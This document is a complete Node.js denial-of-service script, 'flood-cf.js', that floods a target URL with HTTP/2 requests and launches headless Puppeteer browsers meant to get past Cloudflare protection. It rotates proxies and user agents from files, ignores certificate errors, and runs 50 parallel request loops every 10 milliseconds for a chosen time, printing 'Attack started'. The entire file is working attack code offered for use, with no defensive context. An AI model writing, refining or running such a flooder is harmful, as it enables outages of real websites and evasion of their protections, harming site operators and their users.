const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const tls = require('tls');
const http2 = require('http2-wrapper');

const proxyList = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgentList = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

const sendHttp2Request = async (url, proxy, userAgent) => {
  try {
    const session = http2.connect(url, {
      proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] },
      rejectUnauthorized: false
    });
    const req = session.request({
      ':path': '/',
      ':method': 'GET',
      'user-agent': userAgent,
      'cache-control': 'no-cache',
      'pragma': 'no-cache'
    });
    req.setEncoding('utf8');
    req.on('response', () => {});
    req.end();
    setTimeout(() => session.destroy(), 1000);
  } catch (err) {}
};

const bypassCloudflare = async (url, proxy, userAgent) => {
  const browser = await puppeteer.launch({ 
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', `--proxy-server=http://${proxy}`]
  });
  const page = await browser.newPage();
  await page.setUserAgent(userAgent);
  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
  await browser.close();
};

const sendRequest = async (url, timeLimit) => {
  const endTime = Date.now() + timeLimit * 1000;
  let threads = 0;

  while (Date.now() < endTime) {
    for (let i = 0; i < 50; i++) { // 50 threads parallel
      const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
      const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
      sendHttp2Request(url, proxy, userAgent);
      bypassCloudflare(url, proxy, userAgent);
    }
    await new Promise(r => setTimeout(r, 10));
  }
};

const [url, time] = process.argv.slice(2);
const timeLimit = parseInt(time);

if (!url || !timeLimit) {
  console.log('Usage: node flood-cf.js <url> <time>');
  process.exit(1);
}

console.log(': Attack started');
sendRequest(url, timeLimit);